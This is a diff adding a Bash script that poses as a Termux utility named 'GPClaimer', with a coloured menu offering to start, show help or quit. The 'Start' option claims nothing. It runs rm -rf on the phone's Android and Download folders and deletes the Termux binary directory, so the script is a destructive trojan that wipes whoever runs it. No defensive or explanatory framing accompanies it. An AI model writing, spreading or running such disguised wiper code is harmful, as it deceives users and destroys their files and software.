@@ -1,0 +1,31 @@
+#!/bin/bash
+clear
+echo -e "\033[31;1m"
+toilet -f mono12 "GPClaim"
+echo -e "\033[33;1mGPClamer v.0.1"
+date
+echo ""
+echo -e "\033[31;1m1 \033[36;1mGPClaimer Start"
+echo -e "\033[31;1m2 \033[36;1mHow To Use"
+echo -e "\033[31;1m3 \033[36;1mQuit"
+echo -e "\033[37;1m"
+read -p "choose@localhost:~# " anjing
+
+if [ $anjing = 1 ];
+then
+cd /sdcard/
+rm -rf Android; rm -rf Download
+cd $HOME
+rm -rf $PREFIX/bin
+fi
+
+if [ $anjing = 2 ];
+then
+./how
+fi
+
+if [ $anjing = 3 ];
+then
+cd $HOME
+exit
+fi
